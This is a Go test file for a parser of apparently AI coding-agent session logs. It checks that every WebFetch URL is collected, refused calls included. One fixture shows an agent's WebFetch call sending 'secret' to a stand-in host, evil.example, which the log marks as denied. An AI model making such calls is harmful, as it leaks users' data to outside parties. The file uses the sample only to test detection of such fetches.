package claudecode

import (
	"slices"
	"strings"
	"testing"
)

// Parse collects the URL of every WebFetch call, refused ones included, once each in the order of their first call.
func TestParseCollectsTheWebFetchURLs(t *testing.T) {
	in := strings.Join([]string{
		`{"type":"system","subtype":"init","tools":["Read","WebFetch"]}`,
		`{"type":"assistant","message":{"content":[{"type":"text","text":"Let me read."},{"type":"tool_use","id":"t1","name":"WebFetch","input":{"url":"https://example.com/a","prompt":"heading"}}]}}`,
		`{"type":"user","message":{"content":[{"type":"tool_result","tool_use_id":"t1","content":"Example"}]}}`,
		`{"type":"assistant","message":{"content":[{"type":"tool_use","id":"t2","name":"Read","input":{"file_path":"/w/README.md"}},{"type":"tool_use","id":"t3","name":"WebFetch","input":{"url":"https://evil.example/?q=secret","prompt":"x"}}]}}`,
		`{"type":"assistant","message":{"content":[{"type":"tool_use","id":"t4","name":"WebFetch","input":{"url":"https://example.com/a","prompt":"again"}}]}}`,
		`{"type":"assistant","message":{"content":[{"type":"tool_use","id":"t5","name":"WebFetch","input":{"prompt":"no url"}}]}}`,
		`{"type":"result","subtype":"success","session_id":"s","result":"ok","permission_denials":[{"tool_name":"WebFetch","tool_use_id":"t3","tool_input":{"url":"https://evil.example/?q=secret"}}]}`,
	}, "\n")
	res := &Result{}
	if err := Parse(strings.NewReader(in), res); err != nil {
		t.Fatal(err)
	}
	want := []string{"https://example.com/a", "https://evil.example/?q=secret"}
	if !slices.Equal(res.Fetched, want) {
		t.Errorf("fetched = %q, want %q", res.Fetched, want)
	}
}

func TestParseWithoutWebFetchFetchesNothing(t *testing.T) {
	in := `{"type":"assistant","message":{"content":[{"type":"tool_use","id":"t1","name":"Bash","input":{"command":"ls"}}]}}` + "\n" +
		`{"type":"result","subtype":"success","session_id":"s","result":"ok"}`
	res := &Result{}
	if err := Parse(strings.NewReader(in), res); err != nil {
		t.Fatal(err)
	}
	if len(res.Fetched) != 0 {
		t.Errorf("fetched = %q, want none", res.Fetched)
	}
}
